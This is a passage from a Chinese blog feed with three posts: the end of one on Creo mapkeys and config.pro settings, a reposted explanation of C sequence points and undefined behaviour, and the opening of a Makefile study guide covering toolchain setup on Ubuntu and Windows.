class="hljs-number">2</span> -<span class="hljs-number">1.277705</span> <span class="hljs-number">0.365059</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `maindashInst0.offtype_flyout_tb` `4 \<br>mapkey(continued) offtype_flyout`;~ Activate `main_dlg_cur` `4 offtype_flyout` <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>mapkey nside @MAPKEY_LABELN侧曲面<span class="hljs-comment">;~ Command `ProCmdUtilLegacyApp`  1;#SURFACE;\</span><br>mapkey(continued) #<span class="hljs-keyword">NEW</span><span class="hljs-comment">;#ADVANCED;#DONE;#BOUNDARIES;#DONE;#N-SIDED SURF;#DONE;\</span><br>mapkey(continued) ~ Move `Odui_Dlg_01` `Odui_Dlg_01` <span class="hljs-number">2</span> <span class="hljs-number">19.275098</span> <span class="hljs-number">6.680574</span><span class="hljs-comment">;</span><br>mapkey pad @MAPKEY_LABEL尺寸阵列<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Select `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">1</span> `node6`;\<br>mapkey(continued) ~ Trail `MiniToolbar` `MiniToolbar` `UIT_TRANSLUCENT` `NEED_TO_CLOSE`;\<br>mapkey(continued) ~ Command `ProCmdPattern`;<br>mapkey paf @MAPKEY_LABEL方向阵列<span class="hljs-comment">;~ Command `ProCmdPattern` ;\</span><br>mapkey(continued) ~ Open `main_dlg_cur` `maindashInst0.ui_pat_type`;\<br>mapkey(continued) ~ Close `main_dlg_cur` `maindashInst0.ui_pat_type`;\<br>mapkey(continued) ~ Select `main_dlg_cur` `maindashInst0.ui_pat_type` <span class="hljs-number">1</span> `ui_pat_type_dir`;<br>mapkey pah @MAPKEY_LABEL填充阵列<span class="hljs-comment">;~ Command `ProCmdPattern` ;\</span><br>mapkey(continued) ~ Open `main_dlg_cur` `maindashInst0.ui_pat_type`;\<br>mapkey(continued) ~ Close `main_dlg_cur` `maindashInst0.ui_pat_type`;\<br>mapkey(continued) ~ Select `main_dlg_cur` `maindashInst0.ui_pat_type` <span class="hljs-number">1</span> `ui_pat_type_fill`;\<br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.ui_pat_fill_sel_sketch.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `ui_pat_fill_sel_sketch.<span class="hljs-number">0.0</span>` `PH.ui_pat_fill_sketch_name` `0`;\<br>mapkey(continued) ~ Trigger `ui_pat_fill_sel_sketch.<span class="hljs-number">0.0</span>` `PH.ui_pat_fill_sketch_name` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `ui_pat_fill_sel_sketch.<span class="hljs-number">0.0</span>` `PH.ui_pat_fill_sketch_name` `0`;\<br>mapkey(continued) ~ Trigger `ui_pat_fill_sel_sketch.<span class="hljs-number">0.0</span>` `PH.ui_pat_fill_sketch_name` ``<span class="hljs-comment">;</span><br>mapkey pax @MAPKEY_LABEL轴阵列<span class="hljs-comment">;~ Command `ProCmdPattern` ;\</span><br>mapkey(continued) ~ Trigger `main_dlg_cur` `maindashInst0.ui_pat_dim_2_num` `0`;\<br>mapkey(continued) ~ Trigger `main_dlg_cur` `maindashInst0.ui_pat_dim_2_num` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Open `main_dlg_cur` `maindashInst0.ui_pat_type`;\<br>mapkey(continued) ~ Close `main_dlg_cur` `maindashInst0.ui_pat_type`;\<br>mapkey(continued) ~ Select `main_dlg_cur` `maindashInst0.ui_pat_type` <span class="hljs-number">1</span> `ui_pat_type_axis`;\<br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.ui_pat_dim_panel.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ FocusOut `ui_pat_dim_panel.<span class="hljs-number">0.0</span>` `PH.ui_pat_dim_1_array`;\<br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.ui_pat_dim_panel.<span class="hljs-number">0</span>` <span class="hljs-number">0</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.ui_pat_dim_panel.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ FocusOut `ui_pat_dim_panel.<span class="hljs-number">0.0</span>` `PH.ui_pat_dim_1_array`;<br>mapkey trc @MAPKEY_LABEL修剪曲线<span class="hljs-comment">;~ Command `ProCmdFtTrim` ;\</span><br>mapkey(continued) ~ HTMLEnter `main_dlg_cur` `dashboard_page_0|dashboard_help_0|<span class="hljs-number">0</span>.read_more`;\<br>mapkey(continued) ~ HTMLExit `main_dlg_cur` `dashboard_page_0|dashboard_help_0|<span class="hljs-number">0</span>.read_more`;\<br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.trimcrv_refs.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `trimcrv_refs.<span class="hljs-number">0.0</span>` `PH.TrimCurveList` `0`;\<br>mapkey(continued) ~ Trigger `trimcrv_refs.<span class="hljs-number">0.0</span>` `PH.TrimCurveList` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `trimcrv_refs.<span class="hljs-number">0.0</span>` `PH.TrimObjList` `0`;\<br>mapkey(continued) ~ Focus `trimcrv_refs.<span class="hljs-number">0.0</span>` `PH.TrimObjList`;\<br>mapkey(continued) ~ Select `trimcrv_refs.<span class="hljs-number">0.0</span>` `PH.TrimObjList` <span class="hljs-number">0</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `trimcrv_refs.<span class="hljs-number">0.0</span>` `PH.TrimObjList` ``<span class="hljs-comment">;@PAUSE_FOR_SCREEN_PICK;</span><br>mapkey trs @MAPKEY_LABEL修剪曲面<span class="hljs-comment">;~ Command `ProCmdFtTrim` ;\</span><br>mapkey(continued) ~ Enter `main_dlg_cur` `dashInst0.Quit`;\<br>mapkey(continued) ~ <span class="hljs-keyword">Exit</span> `main_dlg_cur` `dashInst0.Quit`;\<br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.surf_trim_references.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.List5` `0`;\<br>mapkey(continued) ~ Trigger `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.List5` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.List1` `0`;\<br>mapkey(continued) ~ Focus `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.List1`;\<br>mapkey(continued) ~ Select `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.List1` <span class="hljs-number">0</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.List1` ``<span class="hljs-comment">;@PAUSE_FOR_SCREEN_PICK;\</span><br>mapkey(continued) ~ Trigger `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.List1` `0`;\<br>mapkey(continued) ~ Focus `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.List1`;\<br>mapkey(continued) ~ Select `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.List1` <span class="hljs-number">0</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.List1` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.List1` `0`;\<br>mapkey(continued) ~ Focus `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.List1`;\<br>mapkey(continued) ~ Select `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.List1` <span class="hljs-number">0</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ RButtonArm `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.List1` `0`;\<br>mapkey(continued) ~ PopupOver `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.ExpList_Wmo02` <span class="hljs-number">1</span> `PH.List1`;\<br>mapkey(continued) ~ Open `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.ExpList_Wmo02`;\<br>mapkey(continued) ~ Trigger `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.List1` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Close `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.ExpList_Wmo02`;\<br>mapkey(continued) ~ Activate `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.DelOne_Wmo02`;\<br>mapkey(continued) ~ Trigger `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.List1` `0`;\<br>mapkey(continued) ~ Trigger `surf_trim_references.<span class="hljs-number">0.0</span>` `PH.List1` ``<span class="hljs-comment">;@PAUSE_FOR_SCREEN_PICK;</span><br></code></pre></td></tr></table></figure><p>其中，包含了快捷键映射和一些其他的配置。</p><p>下面就是我在<code>config.pro</code>文件中添加的快捷键映射。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/cero%E5%BF%AB%E6%8D%B7%E9%94%AE.png"></p><h2 id="其他常用配置"><a href="#其他常用配置" class="headerlink" title="其他常用配置"></a>其他常用配置</h2><p>（设置转场动画时间秒数0.1-0.5较合适越大动画越慢）</p><p>max_animation_time 0.1</p><p>（设置模型线条的显示质量为高–high）</p><p>edge_display_quality high</p><p>（设置下拉菜单时为中英文双语菜单）</p><p>menu_translation both</p><p>（设置系统默认单位为公制单位–毫米、牛顿、秒）</p><p>pro_unit_sys mmns</p><p>(设置长度缺省单位为mm)</p><p>pro_unit_length unit_mm</p><p>(设置质量缺省单位为kg)</p><p>pro_unit_mass unit_kilogram</p><p>（设置历史轨迹文件trail存放目录为c:\temp\轨迹目录）</p><p>trail_dir D:\creo7.0config\trail</p><p>（主窗口下方的信息窗口仅显示3 行文字）</p><p>visible_message_lines 3</p><p>（保持输出的STP文件和proe里颜色一致，也就是导出的STP模型带有颜色）</p><p>step_export_format ap214_cd</p><p>（PROE启动时显示空页面）</p><p>web_browser_homepage about:blank</p><p>(设置工程图缺省绘图比例默认为1比1)</p><p>default_draw_scale 1:1</p><p>(设置相切边不显示)</p><p>tangent_edge_display no</p><p>(设置自动再生特征)</p><p>allow_anatomic_features yes</p><p>(设置质量自动计算，这个参数需要配置模型材料)</p><p>mass_property_calculate automatic</p><p>(允许用户定义“着色显示”着色的尺寸比率，使用缺省的“着色到：全窗口预览”设置。增加该变量，可创建高质量着色，但速度性能降低。减小该变量，产生相反的结果。缺省值为0.5。)</p><p>photorender_preview_scale 0.25到1.0</p><p>【常用配置六】</p><p>使“插入&#x2F; 高级”菜单下的Local Push、Radius Dome、SectionDome、Ear、Lip、Shaft、Flange、Neck 等PROE2000中的旧特征显示在菜单中比如:”唇”高级命令）</p><p>allow_anatomic_features yes</p><p>（对话框的内定字型为Arial，黑体，10 号字）</p><p>default_font 10, arial, bold</p><p>（设置peizhi目录下的gb.dtl为工程图标准模板）</p><p>drawing_setup_file D:\creo7.0config\LH活动绘图GB.dtl</p><p>（指令选单的内定字型为Arial，黑体，10 号字）</p><p>menu_font 10, arial, bold</p><p>（Pro&#x2F;E 的字型使用旧版的大型字）</p><p>use_pre_wildfire_text_font yes</p><p>（组件设计时、预设的模板设为公制单位）</p><p>template_designasm mmns_asm_design.asm</p><p>（模具设计时、预设的模板设为公制单位）</p><p>template_mfgmold mmns_mfg_mold.asm</p><p>（钣金设计时、预设的模板设为公制单位）</p><p>template_sheetmetalpart mmns_part_sheetmetal.prt</p><p>（零件设计时、预设的模板设为公制单位）</p><p>template_solidpart mmns_part_solid.prt</p><p>设置显示的尺寸没有公差</p><p>tol_mode nominal</p><p>设置系统主界面颜色配置文件</p><p>system_colors_file D:\creo7.0config\syscol.scl</p><p>设置输出PDF时使用系统线宽设置</p><p>pdf_use_pentable yes</p><p>设置工程图格式文件路径</p><p>pro_format_dir D:...</p><p>设置零件模板</p><p>template_solidpart D:\creo7.0config\LH_lingjianmuban\lh-ljmb.prt</p><p>设置组件模板</p><p>template_designasm D:\creo7.0config\LH_zujianmuban\mmns_asm_design_abs</p><p>【常用配置七】</p><p>关闭提示音</p><p>bell no</p><p>草绘界面自动摆正视图与屏幕平行</p><p>sketcher_starts_in_2d yes</p><p>设置所有模型模式中非角度尺寸的缺省小数位数</p><p>default_dec_places 3</p><p>设置角度尺寸小数位数</p><p>default_ang_dec_places 2</p><p>设置草绘时的尺寸小数位数</p><p>sketcher_dec_places 2</p><p>设置将图片嵌入工程图中，可以实现工程图打开时预览</p><p>save_drawing_picture_file embed</p><p>设置搜索文件</p><p>search_path_file D:...</p><p>设置下拉菜单的宽度</p><p>set_menu_width 12</p><p>设置图层方式（影响转CAD）</p><p>intf_out_layer part_layer</p><p>指定转CAD的转换设置文件</p><p>dxf_export_mapping_file D:...</p><p>设置模型树配置文件</p><p>mdl_tree_cfg_file D:\creo7.0config\LH_muxingshutree.cfg</p><p>设置系统坐标及基准面显示的字体大小</p><p>text_height_factor 40</p><p>设置注释文件路径</p><p>pro_note_dir D:...</p><p>设置保存副本时自动复制与零件或组件相关的工程图</p><p>rename_drawings_with_object both</p><p>设置使用8笔（影响打印）</p><p>use_8_plotter_pens yes</p><p>设置工程图格式文件的配置文件</p><p>format_setup_file D:\peizhi\format.dtl</p><p>设置工程图用的符号</p><p>pro_symbol_dir D:\creo7.0config\LH_fuhaoku</p><p>设置公差标准为ISO（国标）</p><p>tolerance_standard iso</p><p>设置打印机打印样式文件路径</p><p>pro_plot_config_dir D:\peizhi\print_pcf</p><p>设置材料库文件路径</p><p>pro_material_dir D:\creo7.0config\LH_cailiaoku</p><p>设置打印线宽配置文件</p><p>pen_table_file D:\creo7.0config\LH_dayin\table.pnt</p><p>【常用配置八】</p><p>导出CAD文件默认哪个版本</p><p>(保存DWG 2007版本文件）</p><p>dwg_export_format 2007</p><p>(保存dxf 2007版本文件）</p><p>dxf_export_format 2007</p><p>【常用配置九】</p><p>为工程图设置默认图框</p><p>template_drawing D:\creo7.0config\LH_gongchengtumuban\a4_hh.frm （此为起始目录路径，加文件名。图框一定要放在起始目录里面）</p><p>【常用配置十】</p><p>锁定已经修改的尺寸</p><p>sketcher_lock_modified_dims yes</p><p>如何保存特征树的隐藏状态</p><p>save_objects all (建议不选all,因为到时旧版本会很多。建议使用changed)</p><p>设置工程图，图框库目录</p><p>pro_format_dir D:.… （此为启动目录路径，图框放入启动目录）</p><p>设置绘图区背影色</p><p>system_colors_file D:.…\syscol.scl （此为启动目录路径，配色放入启动目录）</p><p>设置下拉菜单时为中英文双语菜单</p><p>menu_translation both</p><p><strong>同上</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs livescript">单位设置，使用长度mm重量g作为单位<br>pro_unit_length unit_mm<br>pro_unit_mass unit_gram<br>激活绝对精度，公差显示设置和缺省的小数点设置<br>enable_absolute_accuracy <span class="hljs-literal">yes</span><br>default_abs_accuracy <span class="hljs-number">0.001</span><br>tol_display <span class="hljs-literal">no</span><br>tol_mode nominal<br>default_dec_places <span class="hljs-number">2</span><br>打开自动计算模型质量属性选项，保证工程图参数化重量实时更新<br>mass_property_calculate automatic<br>允许工程图视图可以跟随鼠标拖动<br>allow_move_attach_in_dtl_move <span class="hljs-literal">yes</span><br>allow_move_view_with_move <span class="hljs-literal">yes</span><br>设置日期公司，允许使用旧版本指令，激活autobuildz<br>todays_date_note_format %yyyy-%Mmm-%dd<br>allow_anatomic_features <span class="hljs-literal">no</span><br>autobuildz_enabled <span class="hljs-literal">yes</span><br>菜单和帮助信息使用本地化（中文）<br>menu_translation <span class="hljs-literal">yes</span><br>msg_translation <span class="hljs-literal">yes</span><br>help_translation <span class="hljs-literal">yes</span><br>button_name_in_help <span class="hljs-literal">yes</span><br>缺省的模板文件设置<br>template_designasm $PRO_DIRECTORY<span class="hljs-string">\templates\mmns_asm_design.asm</span><br>template_solidpart $PRO_DIRECTORY<span class="hljs-string">\templates\mmns_part_solid.prt</span><br>template_drawing $PRO_DIRECTORY<span class="hljs-string">\templates\a3_drawing.drw</span><br>template_sheetmetalpart $PRO_DIRECTORY<span class="hljs-string">\templates\mmns_part_sheetmetal.prt</span><br>template_mfgmold $PRO_DIRECTORY<span class="hljs-string">\templates\mmns_mfg_mold.mfg</span><br>一些文件保存选项，自动创建同名工程图选项。<br>rename_drawings_with_object both<br>file_open_default_folder working_directory<br>start_model_dir D:<span class="hljs-string">\0_objlib\start-part</span><br>browser_favorite F:<span class="hljs-string">\work</span><br>override_store_back <span class="hljs-literal">yes</span><br>save_drawing_picture_file embed<br>save_objects changed<br>force_new_file_options_dialog <span class="hljs-literal">no</span><br>save_bitmap NONE<br>save_model_display shading_lod<br>save_texture_with_model <span class="hljs-literal">yes</span><br>重要的路径配置。包括库路径。符号路径、格式文件路径等。<br>pro_library_dir D:<span class="hljs-string">\0_objlib</span><br>pro_catalog_dir D:<span class="hljs-string">\0_objlib</span><br>mdl_tree_cfg_file d:<span class="hljs-string">\start_dir\wildfire2.0\tree.cfg</span><br>pro_format_dir D:<span class="hljs-string">\0_objlib\format</span><br>pro_symbol_dir D:<span class="hljs-string">\0_objlib\symbol</span><br>drawing_setup_file D:<span class="hljs-string">\0_objlib\dtl\icedrawing.dtl</span><br>symbol_instance_palette_file D:<span class="hljs-string">\0_objlib\symbol\symbols_palette.drw</span><br>pro_group_dir D:<span class="hljs-string">\0_objlib\udf</span><br>train_file_path d:<span class="hljs-string">\start_dir\trail_dir</span><br>trail_dir D:<span class="hljs-string">\START_DIR\trail_dir</span><br>pro_note_dir D:<span class="hljs-string">\0_objlib\notes</span><br>system_colors_file D:<span class="hljs-string">\0_objlib\color\syscol.scl</span><br>pro_font_dir C:<span class="hljs-string">\WINDOWS\Fonts</span><br>pro_colormap_path D:<span class="hljs-string">\start_dir\wildfire3.0</span><br>global_appearance_file D:<span class="hljs-string">\start_dir\wildfire3.0\ice.dmt</span><br>输入输出重要选项设置<br>intf2d_out_enhanced_ents hatch_only<br>use_export_2d_dialog <span class="hljs-literal">yes</span><br>intf_in_use_template_models <span class="hljs-literal">yes</span><br>dxf_out_scale_views <span class="hljs-literal">yes</span><br>dxf_out_drawing_scale <span class="hljs-literal">yes</span><br>dxf_export_format <span class="hljs-number">2004</span><br>iges_out_assembly_default_mode all_levels<br>dwg_export_format <span class="hljs-number">2004</span><br>intf_out_blanked_entities <span class="hljs-literal">yes</span><br>layout和元件界面自动装配的设置<br>auto_assembly_with_layouts <span class="hljs-literal">yes</span><br>autoplace_single_comp <span class="hljs-literal">yes</span><br>预选择的高亮选项设置<br>prehighlight <span class="hljs-literal">yes</span><br>dim_inactive_components never<br>打印相关设置<br>raster_plot_dpi <span class="hljs-number">100</span><br>use_8_plotter_pens <span class="hljs-literal">yes</span><br>use_software_linefonts <span class="hljs-literal">yes</span><br>pro_plot_config_dir D:<span class="hljs-string">\0_objlib\config</span><br>pen_table_file d:<span class="hljs-string">\0_objlib\config\table.pnt</span><br></code></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.jishulink.com/post/543860">快捷键来源</a></li><li><a href="https://zhuanlan.zhihu.com/p/436985709">其他配置来源</a></li><li><a href="https://www.ugsnx.com/thread-272213-1-1.html">其他配置来源</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>机械</category>
      
      <category>Creo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言中的顺序点</title>
    <link href="/2024/04/17/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E9%A1%BA%E5%BA%8F%E7%82%B9/"/>
    <url>/2024/04/17/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E9%A1%BA%E5%BA%8F%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>C语言中的顺序点是什么情况？</p><span id="more"></span><p>在 C 语言中，我们经常会碰到很多新奇的写法，比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">a[i]=i++;<br>i++ * i++;<br>i = i++;<br>a^=b^=a^=b; <span class="hljs-comment">//swap a, b</span><br></code></pre></td></tr></table></figure><p>而这些表达式，虽然看上去很简洁，但是结果可能是不确定的。因为 ANSI C 中并没有对这些行为定义。</p><p>通常来说，在 <code>C</code> 中，有 3 种情况：</p><ul><li><code>implementation-defined</code>：就是 ANSI C 标准中有明确定义的，编译器必须保证标准所列的特性都已经实现</li><li><code>unspecified</code>：尽管 ANSI C 中有明确定义，但是并没有明确说明应该具有那些特性，也就是说编译器可以自己做一种选择，只要实现了标准所定义的</li><li><code>undefined</code>：未定义，也就是编译器可以不具有这种功能或特性，甚至不接受带有这种特性的程序</li></ul><p>现在，我们再回过头来，看看这些新奇的写法。发现这些语句都有一个特点：在同一个语句中，一个 object 被引用两次以上，且值被修改。</p><p>要解释这种复杂的表达式，我们先来看一个在 C&#x2F;C++ 语言中经常提到的一个概念： <code>sequence point </code>。我们可以把它翻译为 “顺序点”，但是我更愿意翻译为检查点。</p><p><code>sequence point </code>在 C 标准文档中是这样定义的：</p><blockquote><p>A sequence point is a point in time at which the dust has settled and all side effects which have been seen so far are guaranteed to be complete.</p></blockquote><p>翻译过来，意思就是说检查点是指在这个点之前的所有操作和副效果，都会被处理完，然后才会处理检查点之后的东西。 在 ISO IEC 的 Annex C 中，对一个检查点，有明确的说明。说的有点细，我们可以借用 c-faq 上所总结的 3 点：</p><blockquote><p>at the end of the evaluation of a full expression (a full expression is an expression statement, or any other expression which is not a subexpression within any larger expression);<br>at the ||, &amp;&amp;, ?:, and comma operators;<br>at a function call (after the evaluation of all the arguments, and just before the actual call).</p></blockquote><p>也就是说: </p><ul><li>在一个表达式的赋值最后</li><li>在 <code>||</code>，<code>&amp;&amp;</code>，<code>?:</code> </li><li>逗号</li><li>在函数调用的地方<br>都是检查点。</li></ul><p>也许现在，你可能还是不能很好的把握 <code>sequence point </code>。那我们以 自增&#x2F;自减 操作为例，进行一下说明：</p><p>我们都知道自增和自减操作都有两步语义，一个是赋值，另外一个是 加&#x2F;减。哪个先做？那就看是 <code>++i</code>, 还是 <code>i++</code> 了，但是另外一个什么时候做， <code>ANSI C</code> 没有定义， <code>ANSI C</code> 只定义了在检查点的地方，你把这些副操作全部做了就 <code>OK</code> 。但是如果在一个检查点内部，副操作应该什么时候做？那就看你用的是哪个编译器了。</p><p>再看 <code>i=i++;</code>这个语句。检查点在语句结束的地方，但是在检查点内部，却两次引用了 <code>i</code>，且修改了 <code>i</code> 的值。那么最后 <code>i</code> 的值是加了 <code>1</code>, 还是没变？由于 <code>ANSI C</code> 没有明确定义，所以只能看编译器是怎么处理这种情况了。换句话说，在不同的编译器下，这个语句的执行结果可能不一样，这在程序中是绝对不允许的！</p><p>开头所列的其他例子，都是这个道理。那么这个表达式是否有问题： <code>i++ &amp;&amp; i++ </code>？ 这个表达式是正确的， <code>WHY</code> ？回过头来看检查点的定义， <code>&amp;&amp;</code> 是一个检查点，也就是说副操作执行的顺序被 <code>ANSI C</code> 严格定义了 , 那么也就不存在二义性问题了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">arr[i] = arr[i++];<span class="hljs-comment">//undefined behavior</span><br>arr[i] = arr[i + <span class="hljs-number">1</span>];<span class="hljs-comment">//这个是对的</span><br></code></pre></td></tr></table></figure><p>在上面的例子中，第一个写法是错误的：<strong>由于该语句只有一个检查点——解释语句尾。由于其造成了歧义：等号和<code>i++</code>之间的赋值到底哪个先？这是不确定的，所以此为未定义行为。</strong></p><p>第二个写法是对的：<strong>后面的<code>i + 1</code>并没有改变<code>i</code>的值，也没有赋值行为，所以没有造成歧义</strong>。是正确的。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>也就是说再一个语句开始时到一个检测点之间不可以对同一个对象进行两次以上的操作，因为这会造成未定义的行为</strong></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://tinylab.org/c-faq3-8-undefined-behavior-and-sequence-point/">来源</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>c-faq</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Makefile学习总结</title>
    <link href="/2024/04/16/Makefile%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2024/04/16/Makefile%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>对于Makefile学习的总结，同时包含了其他人的总结。</p><span id="more"></span><h1 id="学习环境搭建"><a href="#学习环境搭建" class="headerlink" title="学习环境搭建"></a>学习环境搭建</h1><h3 id="Linux（以Ubuntu为例）"><a href="#Linux（以Ubuntu为例）" class="headerlink" title="Linux（以Ubuntu为例）"></a>Linux（以Ubuntu为例）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install gcc g++ make<br></code></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>学习与演示过程以Windows为主，Windows上装MinGW环境，MinGW官网： <a href="https://www.mingw-w64.org/">https://www.mingw-w64.org/</a><br>之前我们提过两个版本的环境，<strong>MingW-W64-builds</strong>和<strong>w64devkit</strong><br>推荐使用<strong>w64devkit</strong>套件，里面工具比较齐全，还提供模拟了许多Linux命令，用这个套件环境来学习可以保持在Linux与Windows上Makefile书写方式一致。<br>以下是w64devkit与其他包一些命令的区别</p><table><thead><tr><th align="center">w64devkit（模拟Linux）</th><th align="center">MingW-W64-builds或其他套件（Windows cmd命令）</th></tr></thead><tbody><tr><td align="center">make</td><td align="center">mingw32-make</td></tr><tr><td align="center">cc</td><td align="center">gcc</td></tr><tr><td align="center">rm</td><td align="center">del</td></tr><tr><td align="center">touch</td><td align="center"></td></tr><tr><td align="center">ls</td><td align="center">dir</td></tr><tr><td align="center">sh</td><td align="center"></td></tr><tr><td align="center">mv</td><td align="center"></td></tr><tr><td align="center">cp</td><td align="center">copy&#x2F;xcopy</td></tr><tr><td align="center">sed</td><td align="center"></td></tr></tbody></table><p>&nbsp;</p><h3 id="学习材料"><a href="#学习材料" class="headerlink" title="学习材料"></a>学习材料</h3><p>make官方文档： <a href="https://www.gnu.org/software/make/manual/make.html">https://www.gnu.org/software/make/manual/make.html</a></p><p>2048: <a href="https://github.com/plibither8/2048.cpp">https://github.com/plibither8/2048.cpp</a></p><p>sudoku:  <a href="https://github.com/mayerui/sudoku">https://github.com/mayerui/sudoku</a><br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p><h1 id="Makefile基础知识"><a href="#Makefile基础知识" class="headerlink" title="Makefile基础知识"></a>Makefile基础知识</h1><h2 id="make使用流程"><a href="#make使用流程" class="headerlink" title="make使用流程"></a>make使用流程</h2><ol><li>准备好需要编译的源代码</li><li>编写Makefile文件</li><li>在命令行执行make命令</li></ol><p>&nbsp;<br>&nbsp;</p><h2 id="最简单的Makefile"><a href="#最简单的Makefile" class="headerlink" title="最简单的Makefile"></a>最简单的Makefile</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">hello: hello.cpp</span><br>    g++ hello.cpp -o hello <span class="hljs-comment"># 